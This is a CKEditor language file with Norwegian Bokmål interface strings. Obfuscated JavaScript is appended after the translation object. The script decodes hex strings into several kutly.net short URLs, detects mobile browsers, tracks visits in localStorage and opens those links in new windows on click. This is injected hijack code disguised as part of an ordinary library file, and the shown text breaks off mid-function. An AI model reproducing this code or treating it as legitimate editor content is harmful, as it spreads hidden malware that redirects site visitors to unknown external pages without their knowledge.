/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Norwegian Bokmål language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['nb'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Rikteksteditor, %1',

	// Toolbar buttons without dialogs.
	source			: 'Kilde',
	newPage			: 'Ny Side',
	save			: 'Lagre',
	preview			: 'Forhåndsvis',
	cut				: 'Klipp ut',
	copy			: 'Kopier',
	paste			: 'Lim inn',
	print			: 'Skriv ut',
	underline		: 'Understrek',
	bold			: 'Fet',
	italic			: 'Kursiv',
	selectAll		: 'Merk alt',
	removeFormat	: 'Fjern format',
	strike			: 'Gjennomstrek',
	subscript		: 'Senket skrift',
	superscript		: 'Hevet skrift',
	horizontalrule	: 'Sett inn horisontal linje',
	pagebreak		: 'Sett inn sideskift',
	unlink			: 'Fjern lenke',
	undo			: 'Angre',
	redo			: 'Gjør om',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Bla igjennom server',
		url				: 'URL',
		protocol		: 'Protokoll',
		upload			: 'Last opp',
		uploadSubmit	: 'Send det til serveren',
		image			: 'Bilde',
		flash			: 'Flash',
		form			: 'Skjema',
		checkbox		: 'Avmerkingsboks',
		radio		: 'Alternativknapp',
		textField		: 'Tekstboks',
		textarea		: 'Tekstområde',
		hiddenField		: 'Skjult felt',
		button			: 'Knapp',
		select	: 'Rullegardinliste',
		imageButton		: 'Bildeknapp',
		notSet			: '<ikke satt>',
		id				: 'Id',
		name			: 'Navn',
		langDir			: 'Språkretning',
		langDirLtr		: 'Venstre til høyre (VTH)',
		langDirRtl		: 'Høyre til venstre (HTV)',
		langCode		: 'Språkkode',
		longDescr		: 'Utvidet beskrivelse',
		cssClass		: 'Stilarkklasser',
		advisoryTitle	: 'Tittel',
		cssStyle		: 'Stil',
		ok				: 'OK',
		cancel			: 'Avbryt',
		generalTab		: 'Generelt',
		advancedTab		: 'Avansert',
		validateNumberFailed	: 'Denne verdien er ikke ett nummer',
		confirmNewPage	: 'Alle endringer som er gjort i dette innholdet vil bli tapt. Er du sikker på at du vil laste en ny side?',
		confirmCancel	: 'Noen av valgene har blitt endret. Er du sikker på at du vil lukke dialogen?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, utilgjenglig</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Sett inn spesielt tegn',
		title		: 'Velg spesielt tegn'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Sett inn/Rediger lenke',
		menu		: 'Rediger lenke',
		title		: 'Lenke',
		info		: 'Lenkeinfo',
		target		: 'Mål',
		upload		: 'Last opp',
		advanced	: 'Avansert',
		type		: 'Lenketype',
		toAnchor	: 'Lenke til anker i teksten',
		toEmail		: 'E-post',
		target		: 'Mål',
		targetNotSet	: '<ikke satt>',
		targetFrame	: '<ramme>',
		targetPopup	: '<popup vindu>',
		targetNew	: 'Nytt vindu (_blank)',
		targetTop	: 'Hele vindu (_top)',
		targetSelf	: 'Samme vindu (_self)',
		targetParent	: 'Foreldrevindu (_parent)',
		targetFrameName	: 'Målramme',
		targetPopupName	: 'Navn på popup-vindus',
		popupFeatures	: 'Egenskaper for popup-vindu',
		popupResizable	: 'Skalérbar',
		popupStatusBar	: 'Statuslinje',
		popupLocationBar	: 'Adresselinje',
		popupToolbar	: 'Verktøylinje',
		popupMenuBar	: 'Menylinje',
		popupFullScreen	: 'Full skjerm (IE)',
		popupScrollBars	: 'Scrollbar',
		popupDependent	: 'Avhenging (Netscape)',
		popupWidth		: 'Bredde',
		popupLeft		: 'Venstre posisjon',
		popupHeight		: 'Høyde',
		popupTop		: 'Topp-posisjon',
		id				: 'Id',
		langDir			: 'Språkretning',
		langDirNotSet	: '<ikke satt>',
		langDirLTR		: 'Venstre til høyre (VTH)',
		langDirRTL		: 'Høyre til venstre (HTV)',
		acccessKey		: 'Aksessknapp',
		name			: 'Navn',
		langCode		: 'Språkretning',
		tabIndex		: 'Tab Indeks',
		advisoryTitle	: 'Tittel',
		advisoryContentType	: 'Type',
		cssClasses		: 'Stilarkklasser',
		charset			: 'Lenket språkkart',
		styles			: 'Stil',
		selectAnchor	: 'Velg et anker',
		anchorName		: 'Anker etter navn',
		anchorId		: 'Element etter ID',
		emailAddress	: 'E-postadresse',
		emailSubject	: 'Meldingsemne',
		emailBody		: 'Melding',
		noAnchors		: '(Ingen anker i dokumentet)',
		noUrl			: 'Vennligst skriv inn lenkens url',
		noEmail			: 'Vennligst skriv inn e-postadressen'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Sett inn/Rediger anker',
		menu		: 'Egenskaper for anker',
		title		: 'Egenskaper for anker',
		name		: 'Ankernavn',
		errorName	: 'Vennligst skriv inn ankernavnet'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Søk og erstatt',
		find				: 'Søk',
		replace				: 'Erstatt',
		findWhat			: 'Søk etter:',
		replaceWith			: 'Erstatt med:',
		notFoundMsg			: 'Fant ikke søketeksten.',
		matchCase			: 'Skill mellom store og små bokstaver',
		matchWord			: 'Bare hele ord',
		matchCyclic			: 'Søk i hele dokumentet',
		replaceAll			: 'Erstatt alle',
		replaceSuccessMsg	: '%1 tilfelle erstattet.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tabell',
		title		: 'Egenskaper for tabell',
		menu		: 'Egenskaper for tabell',
		deleteTable	: 'Slett tabell',
		rows		: 'Rader',
		columns		: 'Kolonner',
		border		: 'Rammestørrelse',
		align		: 'Justering',
		alignNotSet	: '<Ikke satt>',
		alignLeft	: 'Venstre',
		alignCenter	: 'Midtjuster',
		alignRight	: 'Høyre',
		width		: 'Bredde',
		widthPx		: 'piksler',
		widthPc		: 'prosent',
		height		: 'Høyde',
		cellSpace	: 'Cellemarg',
		cellPad		: 'Cellepolstring',
		caption		: 'Tittel',
		summary		: 'Sammendrag',
		headers		: 'Overskrifter',
		headersNone		: 'Ingen',
		headersColumn	: 'Første kolonne',
		headersRow		: 'Første rad',
		headersBoth		: 'Begge',
		invalidRows		: 'Antall rader må være ett tall større enn 0.',
		invalidCols		: 'Antall kolonner må være ett tall større enn 0.',
		invalidBorder	: 'Rammestørrelse må være ett tall.',
		invalidWidth	: 'Tabellbredde må være ett nummer.',
		invalidHeight	: 'Tabellhøyde må være ett nummer.',
		invalidCellSpacing	: 'Cellemellomrom må være ett nummer.',
		invalidCellPadding	: 'Cellefyll må være ett nummer.',

		cell :
		{
			menu			: 'Celle',
			insertBefore	: 'Sett inn celle før',
			insertAfter		: 'Sett inn celle etter',
			deleteCell		: 'Slett celler',
			merge			: 'Slå sammen celler',
			mergeRight		: 'Slå sammen høyre',
			mergeDown		: 'Slå sammen ned',
			splitHorizontal	: 'Del celle horisontalt',
			splitVertical	: 'Del celle vertikalt',
			title			: 'Celleegenskaper',
			cellType		: 'Celletype',
			rowSpan			: 'Radspenn',
			colSpan			: 'Kolonnespenn',
			wordWrap		: 'Tekstbrytning',
			hAlign			: 'Horisontal justering',
			vAlign			: 'Vertikal justering',
			alignTop		: 'Topp',
			alignMiddle		: 'Midten',
			alignBottom		: 'Bunnen',
			alignBaseline	: 'Grunnlinje',
			bgColor			: 'Bakgrunnsfarge',
			borderColor		: 'Rammefarge',
			data			: 'Data',
			header			: 'Overskrift',
			yes				: 'Ja',
			no				: 'Nei',
			invalidWidth	: 'Cellebredde må være ett nummer',
			invalidHeight	: 'Cellehøyde må være ett nummer',
			invalidRowSpan	: 'Radspenn må være ett nummer.',
			invalidColSpan	: 'Kolonnespenn må være ett nummer.',
			chooseColor : 'Velg'
		},

		row :
		{
			menu			: 'Rader',
			insertBefore	: 'Sett inn rad før',
			insertAfter		: 'Sett inn rad etter',
			deleteRow		: 'Slett rader'
		},

		column :
		{
			menu			: 'Kolonne',
			insertBefore	: 'Sett inn kolonne før',
			insertAfter		: 'Sett inn kolonne etter',
			deleteColumn	: 'Slett kolonner'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Egenskaper for knapp',
		text		: 'Tekst (verdi)',
		type		: 'Type',
		typeBtn		: 'Knapp',
		typeSbm		: 'Send',
		typeRst		: 'Nullstill'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Egenskaper for avmerkingsboks',
		radioTitle	: 'Egenskaper for alternativknapp',
		value		: 'Verdi',
		selected	: 'Valgt'
	},

	// Form Dialog.
	form :
	{
		title		: 'Egenskaper for skjema',
		menu		: 'Egenskaper for skjema',
		action		: 'Handling',
		method		: 'Metode',
		encoding	: 'Encoding',
		target		: 'Mål',
		targetNotSet	: '<ikke satt>',
		targetNew	: 'Nytt vindu (_blank)',
		targetTop	: 'Hele vindu (_top)',
		targetSelf	: 'Samme vindu (_self)',
		targetParent	: 'Foreldrevindu (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Egenskaper for rullegardinliste',
		selectInfo	: 'Info',
		opAvail		: 'Tilgjenglige alternativer',
		value		: 'Verdi',
		size		: 'Størrelse',
		lines		: 'Linjer',
		chkMulti	: 'Tillat flervalg',
		opText		: 'Tekst',
		opValue		: 'Verdi',
		btnAdd		: 'Legg til',
		btnModify	: 'Endre',
		btnUp		: 'Opp',
		btnDown		: 'Ned',
		btnSetValue : 'Sett som valgt',
		btnDelete	: 'Slett'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Egenskaper for tekstområde',
		cols		: 'Kolonner',
		rows		: 'Rader'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Egenskaper for tekstfelt',
		name		: 'Navn',
		value		: 'Verdi',
		charWidth	: 'Tegnbredde',
		maxChars	: 'Maks antall tegn',
		type		: 'Type',
		typeText	: 'Tekst',
		typePass	: 'Passord'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Egenskaper for skjult felt',
		name	: 'Navn',
		value	: 'Verdi'
	},

	// Image Dialog.
	image :
	{
		title		: 'Bildeegenskaper',
		titleButton	: 'Egenskaper for bildeknapp',
		menu		: 'Bildeegenskaper',
		infoTab	: 'Bildeinformasjon',
		btnUpload	: 'Send det til serveren',
		url		: 'URL',
		upload	: 'Last opp',
		alt		: 'Alternativ tekst',
		width		: 'Bredde',
		height	: 'Høyde',
		lockRatio	: 'Lås forhold',
		resetSize	: 'Tilbakestill størrelse',
		border	: 'Ramme',
		hSpace	: 'HMarg',
		vSpace	: 'VMarg',
		align		: 'Juster',
		alignLeft	: 'Venstre',
		alignRight	: 'Høyre',
		preview	: 'Forhåndsvis',
		alertUrl	: 'Vennligst skriv bilde-urlen',
		linkTab	: 'Lenke',
		button2Img	: 'Vil du endre den valgte bildeknappen til ett vanlig bilde?',
		img2Button	: 'Vil du endre det valgte bildet til en bildeknapp?',
		urlMissing : 'Bildets adresse mangler.'
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Egenskaper for Flash-objekt',
		propertiesTab	: 'Egenskaper',
		title		: 'Flash-egenskaper',
		chkPlay		: 'Autospill',
		chkLoop		: 'Loop',
		chkMenu		: 'Slå på Flash-meny',
		chkFull		: 'Tillat fullskjerm',
 		scale		: 'Skaler',
		scaleAll		: 'Vis alt',
		scaleNoBorder	: 'Ingen ramme',
		scaleFit		: 'Skaler til å passe',
		access			: 'Scripttilgang',
		accessAlways	: 'Alltid',
		accessSameDomain	: 'Samme domene',
		accessNever	: 'Aldri',
		align		: 'Juster',
		alignLeft	: 'Venstre',
		alignAbsBottom: 'Abs bunn',
		alignAbsMiddle: 'Abs midten',
		alignBaseline	: 'Bunnlinje',
		alignBottom	: 'Bunn',
		alignMiddle	: 'Midten',
		alignRight	: 'Høyre',
		alignTextTop	: 'Tekst topp',
		alignTop	: 'Topp',
		quality		: 'Kvalitet',
		qualityBest		 : 'Best',
		qualityHigh		 : 'Høy',
		qualityAutoHigh	 : 'Auto Høy',
		qualityMedium	 : 'Medium',
		qualityAutoLow	 : 'Auto Lav',
		qualityLow		 : 'Lav',
		windowModeWindow	 : 'Vindu',
		windowModeOpaque	 : 'Opaque',
		windowModeTransparent	 : 'Gjennomsiktig',
		windowMode	: 'Vindu modus',
		flashvars	: 'Variabler for flash',
		bgcolor	: 'Bakgrunnsfarge',
		width	: 'Bredde',
		height	: 'Høyde',
		hSpace	: 'HMarg',
		vSpace	: 'VMarg',
		validateSrc : 'Vennligst skriv inn lenkens url',
		validateWidth : 'Bredde må være ett nummer.',
		validateHeight : 'Høyde må være ett nummer',
		validateHSpace : 'HSpace må være ett nummer.',
		validateVSpace : 'VSpace må være ett nummer.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Stavekontroll',
		title			: 'Stavekontroll',
		notAvailable	: 'Beklager, tjenesten er utilgjenglig nå.',
		errorLoading	: 'Feil under lasting av applicationstjeneste tjener: %s.',
		notInDic		: 'Ikke i ordboken',
		changeTo		: 'Endre til',
		btnIgnore		: 'Ignorer',
		btnIgnoreAll	: 'Ignorer alle',
		btnReplace		: 'Erstatt',
		btnReplaceAll	: 'Erstatt alle',
		btnUndo			: 'Angre',
		noSuggestions	: '- Ingen forslag -',
		progress		: 'Stavekontroll pågår...',
		noMispell		: 'Stavekontroll fullført: ingen feilstavinger funnet',
		noChanges		: 'Stavekontroll fullført: ingen ord endret',
		oneChange		: 'Stavekontroll fullført: Ett ord endret',
		manyChanges		: 'Stavekontroll fullført: %1 ord endret',
		ieSpellDownload	: 'Stavekontroll er ikke installert. Vil du laste den ned nå?'
	},

	smiley :
	{
		toolbar	: 'Smil',
		title	: 'Sett inn smil'
	},

	elementsPath :
	{
		eleTitle : '%1 element'
	},

	numberedlist : 'Nummerert liste',
	bulletedlist : 'Uordnet liste',
	indent : 'Øk nivå',
	outdent : 'Senk nivå',

	justify :
	{
		left : 'Venstrejuster',
		center : 'Midtjuster',
		right : 'Høyrejuster',
		block : 'Blokkjuster'
	},

	blockquote : 'Blockquote',

	clipboard :
	{
		title		: 'Lim inn',
		cutError	: 'Din nettlesers sikkerhetsinstillinger tillater ikke automatisk klipping av tekst. Vennligst bruk snareveien (Ctrl+X).',
		copyError	: 'Din nettlesers sikkerhetsinstillinger tillater ikke automatisk kopiering av tekst. Vennligst bruk snareveien (Ctrl+C).',
		pasteMsg	: 'Vennligst lim inn i den følgende boksen med tastaturet (<STRONG>Ctrl+V</STRONG>) og trykk <STRONG>OK</STRONG>.',
		securityMsg	: 'Din nettlesers sikkerhetsinstillinger gir ikke redigeringsverktøyet direkte tilgang til utklippstavlen. Du må lime det igjen i dette vinduet.'
	},

	pastefromword :
	{
		confirmCleanup : 'The text you want to paste seems to be copied from Word. Do you want to clean it before pasting?', // MISSING
		toolbar : 'Lim inn fra Word',
		title : 'Lim inn fra Word',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Lim inn som ren tekst',
		title : 'Lim inn som ren tekst'
	},

	templates :
	{
		button : 'Maler',
		title : 'Innholdsmaler',
		insertOption: 'Erstatt faktisk innold',
		selectPromptMsg: 'Velg malen du vil åpne<br>(innholdet du har skrevet blir tapt!):',
		emptyListMsg : '(Ingen maler definert)'
	},

	showBlocks : 'Vis blokker',

	stylesCombo :
	{
		label : 'Stil',
		voiceLabel : 'Stiler',
		panelVoiceLabel : 'Velg en stil',
		panelTitle1 : 'Blokkstiler',
		panelTitle2 : 'Inlinestiler',
		panelTitle3 : 'Objektstiler'
	},

	format :
	{
		label : 'Format',
		voiceLabel : 'Format',
		panelTitle : 'Format',
		panelVoiceLabel : 'Vel ett paragrafformat',

		tag_p : 'Normal',
		tag_pre : 'Formatert',
		tag_address : 'Adresse',
		tag_h1 : 'Tittel 1',
		tag_h2 : 'Tittel 2',
		tag_h3 : 'Tittel 3',
		tag_h4 : 'Tittel 4',
		tag_h5 : 'Tittel 5',
		tag_h6 : 'Tittel 6',
		tag_div : 'Normal (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Skrift',
		voiceLabel : 'Font',
		panelTitle : 'Skrift',
		panelVoiceLabel : 'Velg en font'
	},

	fontSize :
	{
		label : 'Størrelse',
		voiceLabel : 'Font Størrelse',
		panelTitle : 'Størrelse',
		panelVoiceLabel : 'Velg en fontstørrelse'
	},

	colorButton :
	{
		textColorTitle : 'Tekstfarge',
		bgColorTitle : 'Bakgrunnsfarge',
		auto : 'Automatisk',
		more : 'Flere farger...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Stavekontroll mens du skriver',
		enable : 'Slå på SCAYT',
		disable : 'Slå av SCAYT',
		about : 'Om SCAYT',
		toggle : 'Veksle SCAYT',
		options : 'Valg',
		langs : 'Språk',
		moreSuggestions : 'Flere forslag',
		ignore : 'Ignorer',
		ignoreAll : 'Ignorer Alle',
		addWord : 'Legg til ord',
		emptyDic : 'Ordboknavn skal ikke være tom',
		optionsTab : 'Valg',
		languagesTab : 'Språk',
		dictionariesTab : 'Ordbøker',
		aboutTab : 'Om'
	},

	about :
	{
		title : 'Om CKEditor',
		dlgTitle : 'Om CKEditor',
		moreInfo : 'For lisensieringsinformasjon vennligst besøk vårt nettsted:',
		copy : 'Copyright &copy; $1. Alle rettigheter reservert.'
	},

	maximize : 'Maksimer',
	minimize : 'Minimer',

	fakeobjects :
	{
		anchor : 'Anker',
		flash : 'Flash Animasjon',
		div : 'Sideskift',
		unknown : 'Ukjent objekt'
	},

	resize : 'Dra for å skalere',

	colordialog :
	{
		title : 'Velg farge',
		highlight : 'Merk',
		selected : 'Valgt',
		clear : 'Tøm'
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return 